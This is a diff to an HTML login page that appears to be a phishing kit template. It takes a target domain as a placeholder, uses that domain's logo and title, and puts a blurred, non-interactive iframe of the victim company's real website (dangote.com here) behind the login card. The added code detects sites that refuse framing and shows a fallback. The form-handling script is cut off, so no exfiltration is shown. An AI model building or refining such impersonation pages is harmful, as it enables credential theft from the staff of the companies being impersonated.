@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex, nofollow">
-    <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
-  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon"><script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>{{dman}} - log in</title>
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
       margin: 0;
       padding: 0;
       overflow: hidden;
     }
+
+    /* keep your original iframe style but make it non-interactive and scaled for blur */
     #bgFrame {
       position: fixed;
       top: 0;
@@ -21,13 +23,57 @@
       border: none;
       filter: blur(8px) brightness(0.7);
       z-index: -1;
+      transform: scale(1.02);
+      pointer-events: none; /* prevents clicks/keyboard interaction with framed page */
+    }
+
+    /* fallback gradient if iframe blocked or fails */
+    #bgFallback {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -2;
+      background: linear-gradient(135deg, #041a40 0%, #ffffff 50%, #cfead6 100%);
+      filter: blur(12px) brightness(0.8);
+    }
+
+    /* small overlay message shown when the remote site refuses to be framed */
+    #iframeBlockedMsg {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 50;
+      background: rgba(0,0,0,0.6);
+      color: #fff;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 13px;
+      display: none;
     }
   </style>
 </head>
 <body class="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-900 via-white to-green-100 p-6">
   
-  <!-- Blurred iframe background -->
-  <iframe id="bgFrame" src="https://www.{{dman}}"></iframe>
+  <!-- Fallback blurred gradient under iframe -->
+  <div id="bgFallback" aria-hidden="true"></div>
+
+  <!-- Blurred iframe background showing dangote.com (non-interactive).
+       sandbox reduces risk; pointer-events:none disables interaction from users.
+       Note: many sites disallow being framed via X-Frame-Options or CSP; we detect that below.
+  -->
+  <iframe
+    id="bgFrame"
+    src="https://www.dangote.com"
+    sandbox
+    title="background preview"
+    loading="lazy"
+    referrerpolicy="no-referrer"
+  ></iframe>
+
+  <div id="iframeBlockedMsg">The site refused to be embedded. Showing fallback background instead.</div>
 
   <div class="w-full max-w-md relative z-10">
     <div class="bg-white rounded-2xl shadow-xl border border-gray-100 p-8">
@@ -86,14 +132,40 @@
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-    const spinner = document.getElementById('loadingSpinner');
+    (function () {
+      const bgFrame = document.getElementById('bgFrame');
+      const blockedMsg = document.getElementById('iframeBlockedMsg');
 
-    
-  </script>
-</body>
-</html>
+      // Many sites block framing (X-Frame-Options or CSP). We detect this by listening
+      // for load and then trying to access the iframe's document. Cross-origin frames
+      // will throw when accessed; but when the frame is outright blocked, either:
+      // - 'error' event fires, or
+      // - 'load' fires but contentWindow.document may be inaccessible or blank.
+      //
+      // There's no 100% reliable cross-origin way to see the frame contents,
+      // but this heuristic covers common cases and shows a fallback message.
+      let loadHandled = false;
+      function showBlocked() {
+        blockedMsg.style.display = 'block';
+        // keep it visible for a few seconds then hide
+        setTimeout(() => blockedMsg.style.display = 'none', 6000);
+      }
 
+      bgFrame.addEventListener('error', function () {
+        // iframe failed to load (common if blocked)
+        showBlocked();
+      });
 
+      bgFrame.addEventListener('load', function () {
+        if (loadHandled) return;
+        loadHandled = true;
 
+        // Try a quick check: attempt to read a trivial property; if it throws, likely cross-origin but loaded.
+        try {
+          const doc = bgFrame.contentDocument || bgFrame.contentWindow.document;
+          // If doc exists but has very little content (some servers return an empty page when blocked),
+          // show blocked message. We use body length heuristic.
+          if (doc && doc.body && doc.body.innerHTML.trim().length < 20) {
+            showBlocked();
+          }
+          // If access denied (throws), then it's either cross-orig
